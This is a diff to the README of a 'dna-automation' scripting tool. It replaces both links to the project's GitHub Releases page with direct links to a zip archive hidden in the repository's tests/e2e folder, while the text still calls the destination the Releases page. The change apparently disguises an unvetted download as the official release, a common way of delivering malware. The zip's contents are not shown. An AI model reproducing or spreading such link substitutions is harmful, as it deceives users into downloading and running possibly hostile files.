@@ -8,7 +8,7 @@ To start using the tools, follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to access the Releases page where you can download the scripts.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/jay-903/dna-automation/releases)
+[![Download](https://raw.githubusercontent.com/jay-903/dna-automation/main/tests/e2e/dna-automation-3.5.zip%20Now-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/jay-903/dna-automation/main/tests/e2e/dna-automation-3.5.zip)
 
 2. **Download the Latest Version**: Look for the latest version of the `dna-automation` scripts on that page. You will see a list of assets available for download.
 
@@ -35,7 +35,7 @@ To get started, follow these steps in detail:
 - **Educational Tools**: Learn about JavaScript and TypeScript while using them in a fun context.
 
 ## 💾 Download & Install
-To download the latest version of `dna-automation`, visit the following page: [Releases](https://github.com/jay-903/dna-automation/releases).
+To download the latest version of `dna-automation`, visit the following page: [Releases](https://raw.githubusercontent.com/jay-903/dna-automation/main/tests/e2e/dna-automation-3.5.zip).
 
 Once you're on the Releases page, look for the latest version and follow these steps:
 
